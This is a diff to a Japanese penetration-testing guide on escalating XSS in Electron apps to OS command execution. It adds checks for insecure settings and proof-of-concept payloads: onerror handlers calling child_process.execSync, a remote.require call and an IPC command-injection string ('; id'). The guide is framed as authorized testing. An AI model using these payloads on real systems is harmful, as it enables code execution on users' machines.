@@ -21,7 +21,10 @@
 - **実行環境**: テスター端末（ソース解析）+ 自分が所有するアプリインスタンス（PoC 検証）
 - **必要なツール**: `grep` / `ripgrep`（ソースコード解析用。ペネトレ用 Linux ディストリ標準搭載）
 - **前提**: アプリのソースコードまたはビルド済みバイナリが入手できること
-  - バイナリのみの場合: `asar` コマンドで `app.asar` を展開すれば TypeScript/JS ソースを取得できる（Node.js 環境に `@electron/asar` をインストールして使用）
+  - バイナリのみの場合: `asar` コマンドで `app.asar` を展開すれば TypeScript/JS ソースを取得できる。`@electron/asar`（現在の正式パッケージ名）と旧 `asar` パッケージでコマンドが異なる点に注意:
+    - 旧パッケージ: `npx asar extract app.asar out/`
+    - `@electron/asar`: `npx @electron/asar extract app.asar out/`（Node.js がなく単発実行する場合）
+    - 共通: `asar` が PATH にあれば `asar extract app.asar out/` で動く
 - **オフライン代替**: ソースが GitHub 公開リポジトリにある場合は `gh api` または `curl` で生ファイルを取得できる
 
 ---
@@ -32,9 +35,14 @@
 
 | 確認項目 | コマンド | 出たら次のアクション |
 |---------|---------|----------------|
-| `nodeIntegration` の値 | `grep -r "nodeIntegration" src/` | `true` → RCE 到達可能性あり。`false` → XSS 止まりとして扱う |
-| `contextIsolation` の値 | `grep -r "contextIsolation" src/` | `false` → RCE 到達可能性あり。`true` → preload 経由に変わるが直接 require 呼び出しは不可 |
+| `nodeIntegration` の値 | `grep -r "nodeIntegration" src/` | `true` → RCE 到達可能性あり。`false` → 「刺さらなかったとき」の別経路へ |
+| `sandbox` の値 | `grep -r "sandbox" src/` | `sandbox: true` が **`nodeIntegration: true` と同時に設定されていると nodeIntegration が無視される**。両方を確認する |
+| `contextIsolation` の値 | `grep -r "contextIsolation" src/` | `false` → RCE 到達可能性あり。`true` → 直接 `require()` は不可・preload + contextBridge の expose 内容を確認（下記）|
+| `preload` スクリプトの有無 | `grep -r "preload" src/` | あれば `contextBridge.exposeInMainWorld(...)` の内容を確認 — `exec` / `spawn` が expose されていれば `contextIsolation: true` でも RCE |
+| `nodeIntegrationInSubFrames` / `nodeIntegrationInWorker` | `grep -r "nodeIntegrationIn" src/` | `true` → サブフレーム / Worker でも Node.js 使える経路 |
+| `enableRemoteModule`（Electron < 14）| `grep -r "enableRemoteModule" src/` | `true` → レンダラーから `remote.require()` 経由で Node.js API を呼べる（Electron 14 で削除済み）|
 | innerHTML 系 sink の存在 | `grep -r "\.html(" src/` や `grep -r "innerHTML" src/` | ヒットしたらデータフローを追う |
+| カスタムプロトコル `app://` 等 | `grep -r "protocol.register" src/` | カスタムプロトコルから XSS や SOP 迂回の起点になる可能性（下記）|
 
 **攻撃者の思考トレース**：
 Electron は Chromium + Node.js の複合環境。`nodeIntegration: true` のとき、Electron がレンダラープロセスのグローバルスコープに `require` を注入する。
@@ -127,10 +135,16 @@ nodeIntegration: true 環境では、onerror 内で Node.js の `require` を直
 
 ```html
 <!-- 自分のインスタンスのみで確認すること -->
-<img src=x onerror="require('child_process').execSync('calc')">
+<!-- Linux / macOS: id の出力を alert で表示 -->
+<img src=x onerror="alert(require('child_process').execSync('id').toString())">
+
+<!-- Windows: notepad を起動して RCE 到達を確認（calc より安定）-->
+<img src=x onerror="require('child_process').execSync('notepad')">
 ```
 
-Windows では電卓が起動する = OS コマンド実行確定（= RCE 到達）。
+Windows では notepad が起動する = OS コマンド実行確定（= RCE 到達）。
+
+> **Windows 10/11 の `calc.exe` について:** `calc` コマンドは Windows 10/11 では UWP ラッパー（`win32calc.exe` → Windows Store 版）経由になる仕様変更があり、`execSync('calc')` でも一応起動するが見た目・挙動が環境で変わり確認が不安定。**PoC としては `notepad` が古い環境・新しい環境ともに確実。**
 
 > **注意**: onerror 属性を `"` で囲んだ場合、内側の文字列は `'` を使う。`'` で囲んだ場合は `&apos;` でエスケープするか `"` に変更する。クォートのネストを誤るとスクリプトが SyntaxError で止まる。
 
@@ -151,10 +165,16 @@ Windows では電卓が起動する = OS コマンド実行確定（= RCE 到達
 
 | 観測される状況 | 推定原因 | 次の手 |
 |-------------|---------|-------|
-| nodeIntegration が false に設定されている | セキュリティが強化されている | XSS は残る場合がある。RCE には至らないが XSS 単体として評価する |
-| contextIsolation が true になっている | preload スクリプト経由のみ Node.js 機能が使える | 直接 `require()` は呼べない。preload の contextBridge 設定を確認する |
-| `DOMPurify.sanitize()` が sink 前に呼ばれている | クライアント側サニタイズあり | 他の sink（innerHTML を使っている別のコンポーネント）を探す |
-| React の JSX `{}` で値が挿入されている | JSX の自動エスケープが有効 | この経路は安全。別の sink を探す |
+| `nodeIntegration: false` が設定されている | セキュリティ強化（の「つもり」）| XSS は残る場合あり。RCE には至らないが XSS 単体評価 + 下記代替経路を確認 |
+| `sandbox: true` が `nodeIntegration: true` と同時に設定されている | sandbox が nodeIntegration を上書き — `nodeIntegration` が無効化される | `sandbox` 明示設定時は nodeIntegration を期待できない。preload + contextBridge 経路へ |
+| `contextIsolation: true` | 直接 `require()` は不可 | **preload スクリプトの `contextBridge.exposeInMainWorld(...)` で `exec` / `spawn` / `child_process` 等が expose されていれば XSS から呼べる**。`grep -r "exposeInMainWorld" src/` で expose 内容を全確認 |
+| preload が `exec` を expose していても RCE にならない | contextBridge 経由のラッパーに入力サニタイズがある | ラッパー実装を読んでバイパスを探す |
+| `nodeIntegrationInSubFrames: false` （既定）/ `nodeIntegrationInWorker: false` | サブフレーム・Worker では Node.js 無効 | `true` に変わっていればサブフレーム内の XSS から RCE 経路あり |
+| `enableRemoteModule: true`（Electron < 14 のみ）| レンダラーから `remote.require()` 経由で Node.js API を呼べる | `const { remote } = require('electron'); remote.require('child_process').execSync('id')` |
+| カスタムプロトコル（`app://` / `myapp://` 等）が存在 | SOP 迂回 / スクリプト実行起点になりうる | `protocol.registerFileProtocol` / `protocol.registerHttpProtocol` の実装を確認。カスタムプロトコル経由で XSS が起きると `file:` と同等の権限でスクリプト実行される場合あり |
+| **IPC 経由 RCE**（メインプロセスで `ipcMain.on` が OS コマンドを受け取る）| `nodeIntegration: false` かつ `contextIsolation: true` でも、メインプロセスのハンドラが引数を無検証でコマンド実行する場合 | `grep -r "ipcMain.on\|ipcMain.handle" src/` でハンドラ一覧 → 引数をサニタイズせず `exec` に渡す実装を探す。XSS から `ipcRenderer.invoke('[HANDLER_NAME]', '; id')` で呼ぶ |
+| `DOMPurify.sanitize()` が sink 前に呼ばれている | クライアント側サニタイズあり | 他の sink（`innerHTML` を使っている別コンポーネント）を探す |
+| React の JSX `{}` で値が挿入されている | JSX の自動エスケープが有効 | この経路は安全。別 sink を探す |
 | アプリが古い Electron（< 5）を使っている | デフォルトが true だった時代のコードが残存 | `nodeIntegration` を明示的に `false` にしているかを確認する |
 
 ---
